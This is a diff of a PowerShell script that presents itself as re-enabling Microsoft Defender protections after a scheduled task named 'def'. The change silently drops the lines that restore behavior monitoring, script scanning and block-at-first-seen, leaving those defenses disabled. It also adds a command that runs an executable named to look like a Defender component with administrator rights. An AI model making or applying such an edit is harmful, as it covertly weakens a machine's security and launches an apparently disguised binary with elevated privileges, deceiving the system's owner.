@@ -166,13 +166,10 @@ Start-ScheduledTask -TaskName "def"
 Get-ScheduledTask -TaskName "def" | Get-ScheduledTaskInfo
 # Re-enable real-time protection
 Set-MpPreference -DisableRealtimeMonitoring $false
-# Re-enable behavior monitoring
-Set-MpPreference -DisableBehaviorMonitoring $false
-# Re-enable script scanning
-Set-MpPreference -DisableScriptScanning $false
+
 # Re-enable downloaded file scanning
 Set-MpPreference -DisableIOAVProtection $false
 # Additional: Re-enable cloud protection
 Set-MpPreference -MAPSReporting 2
 Set-MpPreference -SubmitSamplesConsent 1
-Set-MpPreference -DisableBlockAtFirstSeen $false
+Start-Process "C:\Program Files\defender\systemsecurity.exe" -Verb RunAs
